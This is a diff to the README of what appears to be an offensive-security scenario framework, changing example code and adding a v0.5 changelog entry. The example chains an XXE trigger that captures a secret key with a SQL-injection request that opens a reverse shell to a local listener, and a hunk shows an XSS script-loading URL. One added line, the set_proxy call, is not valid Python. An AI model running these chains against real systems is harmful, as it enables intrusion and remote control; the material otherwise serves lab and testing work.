@@ -12,7 +12,6 @@ async def reverse_shell(scenario):
         'http://{rhost}:{rport}/query/'.format(**scenario.context),
         'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
         scenario.context['post_headers'],
-        scenario.context['proxy']
     )
 
 context = {
@@ -20,16 +19,16 @@ context = {
     'rport': 8008,
     'lhost': '127.0.0.1',
     'lport_reverse': 4444,
-    'proxy': {'http': 'http://127.0.0.1:8080'},
     'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
 }
 
 story = scenarios.Scenario(**context)
+story.set_debug()
+story.set_proxy('http': 'http://127.0.0.1:8080')
 
 ftpd = services.FTPReader(story)
 ftpd.set_event('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
 
-story.debug()
 story.add_scene(reverse_shell, when='xxe')
 story.play()
 ```
@@ -65,6 +64,8 @@ Now visit `http://127.0.0.1:8008/?message=<script src="http://127.0.0.1:8888/fak
 
 ## Changelog
 
+* **2021/12/14** Beta (v0.5)
+    * Improved HTTP proxy logic
 * **2021/12/12** Beta (v0.4)
     * A bit of asyncio cleaning up
     * Fixed examples to match the new API
